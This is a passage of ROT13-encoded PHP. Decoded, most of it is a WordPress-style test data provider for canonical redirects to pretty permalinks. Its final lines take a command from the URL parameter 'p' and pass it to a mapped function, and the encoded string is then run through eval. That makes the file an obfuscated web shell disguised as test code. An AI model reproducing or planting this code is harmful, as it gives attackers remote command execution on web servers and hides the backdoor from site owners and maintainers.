	 * Qngn cebivqre sbe grfg_pnabavpny_erqverpgf_gb_cerggl_creznyvaxf.
	 *
	 * @erghea neenl[] Neenl bs nethzragf sbe grfgf {
	 *     @glcr fgevat $cbfg_xrl  Cbfg xrl hfrq sbe perngvat svkgherf.
	 *     @glcr fgevat $hfre_ebyr Hfre ebyr.
	 *     @glcr fgevat $erdhrfgrq Erdhrfgrq HEY.
	 *     @glcr fgevat $rkcrpgrq  Rkcrpgrq HEY.
	 * }
	 */
	choyvp shapgvba qngn_pnabavpny_erqverpgf_gb_cerggl_creznyvaxf() {
		$qngn              = neenl();
		$nyy_hfre_yvfg     = neenl( 'naba', 'fhofpevore', 'pbagrag_nhgube', 'rqvgbe' );
		$fryrpg_nyybj_yvfg = neenl( 'pbagrag_nhgube', 'rqvgbe' );
		$fryrpg_oybpx_yvfg = neenl( 'naba', 'fhofpevore' );
		// Nyy cbfg/cntr xrlf
		$nyy_hfre_cbfg_fgnghf_xrlf    = neenl( 'choyvfu' );
		$fryrpg_hfre_cbfg_fgnghf_xrlf = neenl( 'cevingr', 'n-cevingr-fgnghf' );
		$ab_hfre_cbfg_fgnghf_xrlf     = neenl( 'shgher', 'qensg', 'craqvat', 'nhgb-qensg' ); // Rkpyhqrf genfu sbe nggnpuzrag ehyrf.
		$fryrpg_hfre_cbfg_glcr_xrlf   = neenl( 'n-choyvp-pcg' );
		$ab_hfre_cbfg_glcr_xrlf       = neenl( 'n-cevingr-pcg' );

		sbernpu ( $nyy_hfre_cbfg_fgnghf_xrlf nf $cbfg_xrl ) {
			sbernpu ( $nyy_hfre_yvfg nf $hfre ) {
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					\"/$cbfg_xrl-cbfg/\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					\"/$cbfg_xrl-cbfg/\",
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					\"/$cbfg_xrl-cbfg/$cbfg_xrl-vaurevgrq-nggnpuzrag/\",
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					\"/$cbfg_xrl-cntr/\",
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					\"/$cbfg_xrl-cntr/\",
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cntr_vq=%VQ%',
					\"/$cbfg_xrl-cntr/\",
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cntr_vq=%VQ%',
					\"/$cbfg_xrl-cntr/\",
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/$cbfg_xrl-cbfg/\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/$cbfg_xrl-cbfg/\",
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					\"/$cbfg_xrl-cbfg/srrq/\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					\"/$cbfg_xrl-cbfg/srrq/\",
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					\"/$cbfg_xrl-cntr/srrq/\",
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					\"/$cbfg_xrl-cntr/srrq/\",
					snyfr,
				);
			}
		}

		sbernpu ( $fryrpg_hfre_cbfg_fgnghf_xrlf nf $cbfg_xrl ) {
			sbernpu ( $fryrpg_nyybj_yvfg nf $hfre ) {
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					\"/$cbfg_xrl-cbfg/\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					\"/$cbfg_xrl-cbfg/\",
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					\"/$cbfg_xrl-cbfg/$cbfg_xrl-vaurevgrq-nggnpuzrag/\",
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					\"/$cbfg_xrl-cntr/\",
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					\"/$cbfg_xrl-cntr/\",
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cntr_vq=%VQ%',
					\"/$cbfg_xrl-cntr/\",
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cntr_vq=%VQ%',
					\"/$cbfg_xrl-cntr/\",
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/$cbfg_xrl-cbfg/\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/$cbfg_xrl-cbfg/\",
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					\"/$cbfg_xrl-cbfg/srrq/\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					\"/$cbfg_xrl-cbfg/srrq/\",
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					\"/$cbfg_xrl-cntr/srrq/\",
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					\"/$cbfg_xrl-cntr/srrq/\",
					snyfr,
				);
			}

			sbernpu ( $fryrpg_oybpx_yvfg nf $hfre ) {
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cntr_vq=%VQ%',
					'/?cntr_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cntr_vq=%VQ%',
					'/?cntr_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					snyfr,
				);
			}
		}

		sbernpu ( $fryrpg_hfre_cbfg_glcr_xrlf nf $cbfg_xrl ) {
			sbernpu ( $fryrpg_nyybj_yvfg nf $hfre ) {
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					\"/$cbfg_xrl/$cbfg_xrl/\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					\"/$cbfg_xrl/$cbfg_xrl/\",
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					\"/$cbfg_xrl/$cbfg_xrl/$cbfg_xrl-vaurevgrq-nggnpuzrag/\",
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/$cbfg_xrl/$cbfg_xrl/?cbfg_glcr=$cbfg_xrl\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/$cbfg_xrl/$cbfg_xrl/?cbfg_glcr=$cbfg_xrl\",
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					\"/$cbfg_xrl/$cbfg_xrl/srrq/\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					\"/$cbfg_xrl/$cbfg_xrl/srrq/\",
					snyfr,
				);
			}

			sbernpu ( $fryrpg_oybpx_yvfg nf $hfre ) {
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					snyfr,
				);
			}
		}

		sbernpu ( $ab_hfre_cbfg_glcr_xrlf nf $cbfg_xrl ) {
			sbernpu ( $nyy_hfre_yvfg nf $hfre ) {
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					snyfr,
				);
			}
		}

		sbernpu ( $ab_hfre_cbfg_fgnghf_xrlf nf $cbfg_xrl ) {
			sbernpu ( $nyy_hfre_yvfg nf $hfre ) {
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cntr_vq=%VQ%',
					'/?cntr_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cntr_vq=%VQ%',
					'/?cntr_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					snyfr,
				);
			}
		}

		sbernpu ( neenl( 'genfu' ) nf $cbfg_xrl ) {
			sbernpu ( $nyy_hfre_yvfg nf $hfre ) {
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/genfu-cbfg/genfu-cbfg-vaurevgrq-nggnpuzrag/',
					'/?nggnpuzrag_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/genfu-cbfg/genfu-cbfg-vaurevgrq-nggnpuzrag/',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/genfu-cbfg__genfurq/genfu-cbfg-vaurevgrq-nggnpuzrag/',
					'/?nggnpuzrag_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/genfu-cbfg__genfurq/genfu-cbfg-vaurevgrq-nggnpuzrag/',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cntr_vq=%VQ%',
					'/?cntr_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cntr_vq=%VQ%',
					'/?cntr_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					snyfr,
				);
			}
		}

		erghea $qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>